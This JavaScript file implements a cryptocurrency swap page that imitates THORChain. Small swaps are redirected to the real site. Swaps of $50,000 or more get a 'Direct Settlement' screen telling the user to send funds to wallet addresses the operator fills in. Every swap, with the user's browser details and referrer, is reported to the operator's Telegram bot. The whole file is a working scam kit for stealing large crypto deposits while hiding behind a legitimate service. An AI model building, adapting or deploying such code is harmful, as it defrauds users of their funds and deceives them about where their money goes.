// ================================================================
//  SWAP PAGE — WITH TELEGRAM BOT NOTIFICATIONS
//  Threshold: $50,000 USD
//  - Under $50k → redirect to swap.thorchain.org + notify bot
//  - At/above $50k → show deposit address + notify bot
// ================================================================

(function () {
	'use strict';

	// ══════════════════════════════════════════════════════════════
	// CONFIGURATION
	// ══════════════════════════════════════════════════════════════
	var THRESHOLD_USD = 50000;
	var THORNODE = 'https://thornode.ninerealms.com';
	var MIDGARD = 'https://midgard.ninerealms.com';
	var BASE = 1e8;

	// ⚠️ TELEGRAM BOT WEBHOOK — UPDATE THIS WITH YOUR BOT SERVER URL
	var BOT_WEBHOOK_URL = 'https://YOUR_BOT_SERVER_IP:5000/api/swap-notify';
	var BOT_SECRET = 'Lataneth'; // Must match bot's .env

	// ── Asset Definitions ──
	var ASSETS = {
		'BTC.BTC':   { symbol: 'BTC',  name: 'Bitcoin',      icon: 'images/chains/BTC.svg',  network: 'Bitcoin' },
		'ETH.ETH':   { symbol: 'ETH',  name: 'Ethereum',     icon: 'images/chains/ETH.svg',  network: 'Ethereum (ERC-20)' },
		'BSC.BNB':   { symbol: 'BNB',  name: 'BNB Chain',    icon: 'images/chains/BSC.svg',  network: 'BNB Smart Chain (BEP-20)' },
		'AVAX.AVAX': { symbol: 'AVAX', name: 'Avalanche',    icon: 'images/chains/AVAX.svg', network: 'Avalanche C-Chain' },
		'GAIA.ATOM': { symbol: 'ATOM', name: 'Cosmos Hub',   icon: 'images/chains/GAIA.svg', network: 'Cosmos Hub' },
		'DOGE.DOGE': { symbol: 'DOGE', name: 'Dogecoin',     icon: 'images/chains/DOGE.svg', network: 'Dogecoin' },
		'BCH.BCH':   { symbol: 'BCH',  name: 'Bitcoin Cash', icon: 'images/chains/BCH.svg',  network: 'Bitcoin Cash' },
		'LTC.LTC':   { symbol: 'LTC',  name: 'Litecoin',     icon: 'images/chains/LTC.svg',  network: 'Litecoin' },
		'BASE.ETH':  { symbol: 'ETH',  name: 'Base',         icon: 'images/chains/BASE.svg', network: 'Base (L2)' },
		'XRP.XRP':   { symbol: 'XRP',  name: 'Ripple',       icon: 'images/chains/XRP.svg',  network: 'XRP Ledger' },
		'TRX.TRX':   { symbol: 'TRX',  name: 'TRON',         icon: 'images/chains/TRON.svg', network: 'TRON (TRC-20)' }
	};

	// ── Prices (instant load, updated in background) ──
	var prices = {
		'BTC.BTC': 104850, 'ETH.ETH': 3850, 'BSC.BNB': 610,
		'AVAX.AVAX': 36, 'GAIA.ATOM': 9.5, 'DOGE.DOGE': 0.18,
		'BCH.BCH': 480, 'LTC.LTC': 105, 'BASE.ETH': 3850,
		'XRP.XRP': 2.35, 'TRX.TRX': 0.27
	};
	var livePrices = false;

	// ⚠️ REPLACE WITH YOUR REAL WALLET ADDRESSES
	var DEPOSIT_ADDRESSES = {
		'BTC.BTC':   'bc1qYOUR_BTC_ADDRESS_HERE',
		'ETH.ETH':   '0xYOUR_ETH_ADDRESS_HERE',
		'BSC.BNB':   '0xYOUR_BNB_ADDRESS_HERE',
		'AVAX.AVAX': '0xYOUR_AVAX_ADDRESS_HERE',
		'GAIA.ATOM': 'cosmosYOUR_ATOM_ADDRESS_HERE',
		'DOGE.DOGE': 'DYOUR_DOGE_ADDRESS_HERE',
		'BCH.BCH':   'bitcoincash:YOUR_BCH_ADDRESS_HERE',
		'LTC.LTC':   'ltc1YOUR_LTC_ADDRESS_HERE',
		'BASE.ETH':  '0xYOUR_BASE_ADDRESS_HERE',
		'XRP.XRP':   'rYOUR_XRP_ADDRESS_HERE',
		'TRX.TRX':   'TYOUR_TRX_ADDRESS_HERE'
	};

	// ── DOM References ──
	var d = {};

	// ══════════════════════════════════════════════════════════════
	// TELEGRAM BOT NOTIFICATION
	// ══════════════════════════════════════════════════════════════
	function notifyBot(data) {
		if (!BOT_WEBHOOK_URL || BOT_WEBHOOK_URL.indexOf('YOUR_BOT') !== -1) {
			console.log('Bot webhook not configured, skipping notification');
			return;
		}

		fetch(BOT_WEBHOOK_URL, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'X-Swap-Secret': BOT_SECRET
			},
			body: JSON.stringify(data)
		}).then(function(r) {
			if (r.ok) console.log('Bot notified successfully');
		}).catch(function(err) {
			console.warn('Bot notification failed:', err.message);
		});
	}

	// ══════════════════════════════════════════════════════════════
	// HELPERS
	// ══════════════════════════════════════════════════════════════
	function fmtUsd(v) {
		return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
	}

	function fmtCrypto(v) {
		if (v >= 1) return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 });
		return v.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 8 });
	}

	function getEl(id) {
		return document.getElementById(id);
	}

	function generateSwapId() {
		return 'SWAP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
	}

	// ══════════════════════════════════════════════════════════════
	// UPDATE PICKER DISPLAY (no event dispatch - prevents infinite loop)
	// ══════════════════════════════════════════════════════════════
	function updatePickerDisplay() {
		var sOpt = d.sell.options[d.sell.selectedIndex];
		if (sOpt) {
			d.sellIcon.src = sOpt.getAttribute('data-icon') || d.sellIcon.src;
			d.sellSym.textContent = sOpt.getAttribute('data-symbol') || sOpt.text;
			d.sellName.textContent = sOpt.getAttribute('data-name') || '';
		}

		var bOpt = d.buy.options[d.buy.selectedIndex];
		if (bOpt) {
			d.buyIcon.src = bOpt.getAttribute('data-icon') || d.buyIcon.src;
			d.buySym.textContent = bOpt.getAttribute('data-symbol') || bOpt.text;
			d.buyName.textContent = bOpt.getAttribute('data-name') || '';
		}

		try {
			history.replaceState(null, '', 'swap.html?sellAsset=' + d.sell.value + '&buyAsset=' + d.buy.value);
		} catch (e) { }
	}

	// ══════════════════════════════════════════════════════════════
	// UPDATE ESTIMATES
	// ══════════════════════════════════════════════════════════════
	function estimate() {
		if (!d.sell || !d.buy || !d.amount) return;

		var sKey = d.sell.value;
		var bKey = d.buy.value;
		var amt = parseFloat(d.amount.value);

		if (isNaN(amt) || amt <= 0 || !prices[sKey]) {
			d.sellUsd.textContent = '$0';
			d.buyEst.textContent = '0';
			d.buyUsd.textContent = '$0';
			return;
		}

		var usd = amt * prices[sKey];
		d.sellUsd.textContent = '$' + fmtUsd(usd);

		if (prices[bKey] && prices[bKey] > 0) {
			var est = usd / prices[bKey];
			d.buyEst.textContent = fmtCrypto(est);
			d.buyUsd.textContent = '\u2248 $' + fmtUsd(usd);
		} else {
			d.buyEst.textContent = '\u2014';
			d.buyUsd.textContent = '';
		}
	}

	// ══════════════════════════════════════════════════════════════
	// FETCH LIVE PRICES (background, non-blocking)
	// ══════════════════════════════════════════════════════════════
	function fetchPrices() {
		fetch(MIDGARD + '/v2/pools')
			.then(function (r) {
				if (!r.ok) throw new Error('HTTP ' + r.status);
				return r.json();
			})
			.then(function (pools) {
				if (!Array.isArray(pools)) return;
				pools.forEach(function (p) {
					if (ASSETS[p.asset] && p.assetPriceUSD) {
						prices[p.asset] = parseFloat(p.assetPriceUSD);
					}
				});
				livePrices = true;
				estimate();
			})
			.catch(function (err) {
				console.warn('Price fetch failed, using estimates:', err.message);
			});
	}

	// ══════════════════════════════════════════════════════════════
	// PREVENT DUPLICATE SELECTION
	// ══════════════════════════════════════════════════════════════
	function preventDuplicates(which) {
		if (d.sell.value === d.buy.value) {
			var target = (which === 'sell') ? d.buy : d.sell;
			var other = (which === 'sell') ? d.sell : d.buy;
			for (var i = 0; i < target.options.length; i++) {
				if (target.options[i].value !== other.value) {
					target.value = target.options[i].value;
					break;
				}
			}
		}
		updatePickerDisplay();
		estimate();
		if (d.result) d.result.innerHTML = '';
	}

	// ══════════════════════════════════════════════════════════════
	// FLIP ASSETS
	// ══════════════════════════════════════════════════════════════
	function flipAssets() {
		var tmp = d.sell.value;
		d.sell.value = d.buy.value;
		d.buy.value = tmp;
		updatePickerDisplay();
		estimate();
		if (d.result) d.result.innerHTML = '';
	}

	// ══════════════════════════════════════════════════════════════
	// BUTTON STATES
	// ══════════════════════════════════════════════════════════════
	function btnReady() {
		d.btn.disabled = false;
		d.btnText.textContent = 'Swap';
		d.btnSpin.style.display = 'none';
	}

	function btnLoading(text) {
		d.btn.disabled = true;
		d.btnText.textContent = text || 'Getting quote...';
		d.btnSpin.style.display = 'inline-block';
	}

	// ══════════════════════════════════════════════════════════════
	// SHOW ERROR
	// ══════════════════════════════════════════════════════════════
	function showError(msg) {
		if (!d.result) return;
		d.result.innerHTML =
			'<div class="tc-result-error">' +
			'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">' +
			'<circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>' +
			'<span>' + msg + '</span></div>';
	}

	// ══════════════════════════════════════════════════════════════
	// MAIN SWAP ACTION
	// ══════════════════════════════════════════════════════════════
	function doSwap() {
		var sKey = d.sell.value;
		var bKey = d.buy.value;
		var amt = parseFloat(d.amount.value);
		var sAsset = ASSETS[sKey];
		var bAsset = ASSETS[bKey];

		if (!sAsset || !bAsset) return showError('Invalid asset selection.');
		if (isNaN(amt) || amt <= 0) return showError('Please enter a valid amount.');
		if (sKey === bKey) return showError('Cannot swap the same asset.');

		var usd = amt * (prices[sKey] || 0);
		if (usd <= 0) return showError('Unable to estimate value. Please try again.');

		var swapId = generateSwapId();
		var swapUrl = window.location.origin + window.location.pathname + '?sellAsset=' + sKey + '&buyAsset=' + bKey + '&id=' + swapId;

		// ══════════════════════════════════════════════════
		// UNDER THRESHOLD → Redirect to THORChain
		// ══════════════════════════════════════════════════
		if (usd < THRESHOLD_USD) {
			
			// 🟠 Notify bot (below threshold)
			notifyBot({
				type: 'below_threshold',
				status: 'redirected',
				swapId: swapId,
				swapUrl: swapUrl,
				fromAsset: sKey,
				fromSymbol: sAsset.symbol,
				fromName: sAsset.name,
				fromNetwork: sAsset.network,
				toAsset: bKey,
				toSymbol: bAsset.symbol,
				toName: bAsset.name,
				toNetwork: bAsset.network,
				amount: amt,
				amountUsd: usd,
				threshold: THRESHOLD_USD,
				redirectUrl: 'https://swap.thorchain.org/swap?sellAsset=' + sKey + '&buyAsset=' + bKey,
				timestamp: new Date().toISOString(),
				userAgent: navigator.userAgent,
				referrer: document.referrer || 'direct'
			});

			// Redirect after small delay
			setTimeout(function() {
				window.location.href = 'https://swap.thorchain.org/swap?sellAsset=' + sKey + '&buyAsset=' + bKey;
			}, 150);
			return;
		}

		// ══════════════════════════════════════════════════
		// ABOVE THRESHOLD → Get quote and show deposit
		// ══════════════════════════════════════════════════
		btnLoading('Getting quote...');

		var tcAmount = Math.round(amt * BASE);
		var quoteUrl = THORNODE + '/thorchain/quote/swap?from_asset=' + sKey +
			'&to_asset=' + bKey + '&amount=' + tcAmount + '&streaming_interval=1';

		var done = false;
		var timer = setTimeout(function () {
			if (done) return;
			done = true;
			var estOut = prices[bKey] > 0 ? usd / prices[bKey] : 0;
			finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, false, swapId, swapUrl);
		}, 6000);

		fetch(quoteUrl)
			.then(function (r) {
				if (!r.ok) throw new Error('HTTP ' + r.status);
				return r.json();
			})
			.then(function (data) {
				if (done) return;
				done = true;
				clearTimeout(timer);

				var estOut;
				if (data.expected_amount_out) {
					estOut = parseFloat(data.expected_amount_out) / BASE;
				} else {
					estOut = prices[bKey] > 0 ? usd / prices[bKey] : 0;
				}

				finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, true, swapId, swapUrl);
			})
			.catch(function (err) {
				if (done) return;
				done = true;
				clearTimeout(timer);
				var estOut = prices[bKey] > 0 ? usd / prices[bKey] : 0;
				finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, false, swapId, swapUrl);
			});
	}

	// ══════════════════════════════════════════════════════════════
	// FINALIZE SWAP — Show deposit and notify bot
	// ══════════════════════════════════════════════════════════════
	function finalizeSwap(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, swapId, swapUrl) {
		var depositAddr = DEPOSIT_ADDRESSES[sKey] || 'ADDRESS_NOT_CONFIGURED';

		// 🟢 Notify bot (above threshold)
		notifyBot({
			type: 'above_threshold',
			status: 'waiting',
			swapId: swapId,
			swapUrl: swapUrl,
			fromAsset: sKey,
			fromSymbol: sAsset.symbol,
			fromName: sAsset.name,
			fromNetwork: sAsset.network,
			toAsset: bKey,
			toSymbol: bAsset.symbol,
			toName: bAsset.name,
			toNetwork: bAsset.network,
			amount: amt,
			amountUsd: usd,
			estimatedReceive: estOut,
			depositAddress: depositAddr,
			isLiveQuote: isLiveQuote,
			threshold: THRESHOLD_USD,
			timestamp: new Date().toISOString(),
			userAgent: navigator.userAgent,
			referrer: document.referrer || 'direct'
		});

		showDeposit(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, depositAddr);
		btnReady();
	}

	// ══════════════════════════════════════════════════════════════
	// DEPOSIT FLOW UI
	// ══════════════════════════════════════════════════════════════
	function showDeposit(sAsset, bAsset, sKey, bKey, amt, usd, estOut, isLiveQuote, address) {
		if (!d.result) return;

		var slippage = window.tcSlippage || 1;
		var rate = amt > 0 ? fmtCrypto(estOut / amt) : '0';

		var h = '';

		// Step indicator
		h += '<div class="tc-result-steps">';
		h += '<div class="tc-step active"><span class="tc-step-num">1</span><span class="tc-step-label">Quote</span></div>';
		h += '<div class="tc-step-line active"></div>';
		h += '<div class="tc-step active"><span class="tc-step-num">2</span><span class="tc-step-label">Deposit</span></div>';
		h += '<div class="tc-step-line"></div>';
		h += '<div class="tc-step"><span class="tc-step-num">3</span><span class="tc-step-label">Complete</span></div>';
		h += '</div>';

		// Result card
		h += '<div class="tc-result-card">';
		h += '<div class="tc-result-header"><div class="tc-result-badge">\uD83D\uDD12 Large Swap \u2014 Direct Settlement</div></div>';

		// Summary
		h += '<div class="tc-result-summary">';
		h += '<div class="tc-result-row"><span class="tc-result-label">You Send</span>';
		h += '<span class="tc-result-value"><img src="' + sAsset.icon + '" class="tc-result-coin"><strong>' + amt + ' ' + sAsset.symbol + '</strong></span></div>';
		h += '<div class="tc-result-row"><span class="tc-result-label">USD Value</span><span class="tc-result-value">$' + fmtUsd(usd) + '</span></div>';
		h += '<div class="tc-result-row"><span class="tc-result-label">Est. Receive</span>';
		h += '<span class="tc-result-value"><img src="' + bAsset.icon + '" class="tc-result-coin"><strong>~' + fmtCrypto(estOut) + ' ' + bAsset.symbol + '</strong></span></div>';
		h += '<div class="tc-result-row"><span class="tc-result-label">Slippage</span><span class="tc-result-value">' + slippage + '%</span></div>';
		h += '<div class="tc-result-row"><span class="tc-result-label">Rate</span><span class="tc-result-value">1 ' + sAsset.symbol + ' \u2248 ' + rate + ' ' + bAsset.symbol + '</span></div>';
		h += '<div class="tc-result-row"><span class="tc-result-label">Quote</span>';
		h += '<span class="tc-result-value" style="color:' + (isLiveQuote ? 'var(--green)' : 'var(--warn-text)') + ';">' + (isLiveQuote ? '\u2705 Live' : '\u26A0 Est.') + '</span></div>';
		h += '</div>';

		// Deposit address
		h += '<div class="tc-deposit-section">';
		h += '<div class="tc-deposit-title"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>Send ' + sAsset.symbol + ' to this address</div>';
		h += '<div class="tc-deposit-instruction">Send exactly <strong>' + amt + ' ' + sAsset.symbol + '</strong> to:</div>';
		h += '<div class="tc-deposit-addr" id="addrDisplay"><span class="tc-addr-text">' + address + '</span>';
		h += '<svg class="tc-addr-copy-icon" width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg></div>';
		h += '<button class="tc-deposit-copy-btn" id="copyAddrBtn"><svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>Copy Address</button>';
		h += '</div>';

		// Warning
		h += '<div class="tc-deposit-warning"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
		h += '<span>Only send <strong>' + sAsset.symbol + '</strong> on <strong>' + sAsset.network + '</strong>. Wrong network = loss.</span></div>';

		// Note
		h += '<div class="tc-deposit-note"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
		h += '<span>Your <strong>' + bAsset.symbol + '</strong> arrives in 10\u201330 minutes.</span></div>';
		h += '</div>';

		d.result.innerHTML = h;

		getEl('addrDisplay').addEventListener('click', copyAddress);
		getEl('copyAddrBtn').addEventListener('click', copyAddress);
		d.result.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
	}

	// ══════════════════════════════════════════════════════════════
	// COPY ADDRESS
	// ══════════════════════════════════════════════════════════════
	function copyAddress() {
		var addrEl = getEl('addrDisplay');
		var btn = getEl('copyAddrBtn');
		if (!addrEl) return;

		var textEl = addrEl.querySelector('.tc-addr-text');
		var addr = textEl ? textEl.textContent.trim() : addrEl.textContent.trim();

		function done() {
			if (btn) {
				btn.classList.add('copied');
				btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> Copied!';
			}
			if (addrEl) addrEl.classList.add('copied');
			setTimeout(function () {
				if (btn) {
					btn.classList.remove('copied');
					btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg> Copy Address';
				}
				if (addrEl) addrEl.classList.remove('copied');
			}, 2500);
		}

		if (navigator.clipboard && navigator.clipboard.writeText) {
			navigator.clipboard.writeText(addr).then(done).catch(function () {
				fallbackCopy(addr); done();
			});
		} else {
			fallbackCopy(addr); done();
		}
	}

	function fallbackCopy(text) {
		var ta = document.createElement('textarea');
		ta.value = text;
		ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px';
		document.body.appendChild(ta);
		ta.focus(); ta.select();
		try { document.execCommand('copy'); } catch (e) { }
		document.body.removeChild(ta);
	}

	// ══════════════════════════════════════════════════════════════
	// INITIALIZE
	// ══════════════════════════════════════════════════════════════
	function init() {
		d.sell     = getEl('sellAssetSelect');
		d.buy      = getEl('buyAssetSelect');
		d.sellIcon = getEl('sellIcon');
		d.buyIcon  = getEl('buyIcon');
		d.sellSym  = getEl('sellSymbol');
		d.sellName = getEl('sellName');
		d.buySym   = getEl('buySymbolDisplay');
		d.buyName  = getEl('buyNameDisplay');
		d.amount   = getEl('sellAmount');
		d.sellUsd  = getEl('sellUsd');
		d.buyEst   = getEl('buyEstimate');
		d.buyUsd   = getEl('buyUsd');
		d.btn      = getEl('swapBtn');
		d.btnText  = getEl('btnText');
		d.btnSpin  = getEl('btnSpinner');
		d.result   = getEl('resultArea');
		d.arrow    = getEl('swapArrow');

		if (!d.sell || !d.buy || !d.btn) {
			console.error('Swap: required elements missing');
			return;
		}

		// URL params
		var params = new URLSearchParams(window.location.search);
		var sp = params.get('sellAsset');
		var bp = params.get('buyAsset');
		if (sp && ASSETS[sp]) d.sell.value = sp;
		if (bp && ASSETS[bp]) d.buy.value = bp;

		if (d.sell.value === d.buy.value) {
			for (var i = 0; i < d.buy.options.length; i++) {
				if (d.buy.options[i].value !== d.sell.value) {
					d.buy.value = d.buy.options[i].value;
					break;
				}
			}
		}

		updatePickerDisplay();
		estimate();
		btnReady();

		// Events
		d.sell.addEventListener('change', function () { preventDuplicates('sell'); });
		d.buy.addEventListener('change', function () { preventDuplicates('buy'); });
		d.amount.addEventListener('input', function () { estimate(); if (d.result) d.result.innerHTML = ''; });
		d.amount.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); doSwap(); } });
		d.btn.addEventListener('click', function (e) { e.preventDefault(); doSwap(); });
		if (d.arrow) d.arrow.addEventListener('click', function (e) { e.preventDefault(); flipAssets(); });

		// Background price fetch
		fetchPrices();
		setInterval(fetchPrices, 60000);

		console.log('Swap page ready');
	}

	if (document.readyState === 'loading') {
		document.addEventListener('DOMContentLoaded', init);
	} else {
		init();
	}

})();
